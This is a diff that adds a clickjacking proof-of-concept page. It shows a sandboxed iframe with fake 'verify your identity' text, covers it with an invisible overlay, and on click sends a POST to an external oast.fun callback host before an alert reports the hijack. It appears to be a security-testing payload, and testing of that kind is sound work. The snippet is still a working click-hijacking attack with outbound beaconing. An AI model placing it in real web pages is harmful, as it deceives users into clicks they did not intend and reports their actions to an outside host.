@@ -1,0 +1,25 @@
+<!-- SANDBOXED IFRAME CLICK TRICK -->
+<iframe srcdoc="<h2>🔐 Click here to verify your identity</h2>" 
+        sandbox="allow-scripts allow-popups" 
+        style="width:400px;height:150px;border:1px solid #ccc;margin:60px auto;display:block;">
+</iframe>
+
+<script>
+  const overlay3 = document.createElement('div');
+  overlay3.style.position = 'absolute';
+  overlay3.style.top = '60px';
+  overlay3.style.left = 'calc(50% - 200px)';
+  overlay3.style.width = '400px';
+  overlay3.style.height = '150px';
+  overlay3.style.zIndex = '9999';
+  overlay3.style.background = 'rgba(255,255,255,0.001)';
+  overlay3.onclick = () => {
+    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/iframe-click', {
+      method: 'POST',
+      body: JSON.stringify({ event: 'sandbox_iframe_clicked' }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+    alert("🛡️ Click in iframe was hijacked.");
+  };
+  document.body.appendChild(overlay3);
+</script>
